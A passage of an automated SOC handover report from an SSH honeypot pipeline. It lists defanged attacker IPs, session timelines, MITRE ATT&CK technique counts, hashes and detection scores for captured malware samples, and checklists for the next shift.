| `2026-04-17 12:23:57` | `cowrie.command.failed` |
| `2026-04-17 12:23:57` | `cowrie.log.closed` |
| `2026-04-17 12:23:58` | `cowrie.session.params` |
| `2026-04-17 12:23:58` | `cowrie.command.input` |
| `2026-04-17 12:23:58` | `cowrie.session.file_download` |
| `2026-04-17 12:23:58` | `cowrie.log.closed` |
| `2026-04-17 12:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a2e9df54df

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-04-17 12:24 |
| **Last Seen** | 2026-04-17 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 12:24:02` | `cowrie.session.connect` |
| `2026-04-17 12:24:02` | `cowrie.client.version` |
| `2026-04-17 12:24:02` | `cowrie.client.kex` |
| `2026-04-17 12:24:03` | `cowrie.login.success` |
| `2026-04-17 12:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.14[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.243.14[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.68.65[.]117` | **26** | 2026-04-17 11:40 | 2026-04-17 12:19 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **7** | 2026-04-17 11:35 | 2026-04-17 11:41 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `18.218.118[.]203` | **6** | 2026-04-17 11:01 | 2026-04-17 11:06 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `106.13.69[.]159` | **2** | 2026-04-17 12:24 | 2026-04-17 12:27 | 4m | 0 | `T1592` | 🟢 LOW |
| `49.251.137[.]156` | **2** | 2026-04-17 11:31 | 2026-04-17 11:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.29.255[.]113` | 1 | 2026-04-17 12:20 | 2026-04-17 12:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.238[.]30` | 1 | 2026-04-17 11:41 | 2026-04-17 11:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.252.112[.]58` | 1 | 2026-04-17 11:30 | 2026-04-17 11:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-17 11:17 | 2026-04-17 11:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `197.243.14[.]52` | 1 | 2026-04-17 12:23 | 2026-04-17 12:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.163.114[.]60` | 1 | 2026-04-17 12:48 | 2026-04-17 12:48 | 30s | 0 | `T1592` | 🟢 LOW |
| `43.247.250[.]115` | 1 | 2026-04-17 11:45 | 2026-04-17 11:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-17 12:11 | 2026-04-17 12:12 | 19s | 0 | `T1592` | 🟢 LOW |
| `98.89.3[.]242` | 1 | 2026-04-17 12:56 | 2026-04-17 12:56 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.252.112[.]58` | KR | HVAra | **100** ⚠️ | 11 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `98.89.3[.]242` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 19 |
| `24.163.114[.]60` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `51.68.65[.]117` | FR | OVH SAS | **100** ⚠️ | 50 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `43.247.250[.]115` | CN | Beijing Jiyuanlvgang Technology and Service Center | **100** ⚠️ | 22 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `106.13.69[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 85 cases |
| Tool 34  | Credential Extractor        | ✅ 70 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 43 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T13:27:32Z_
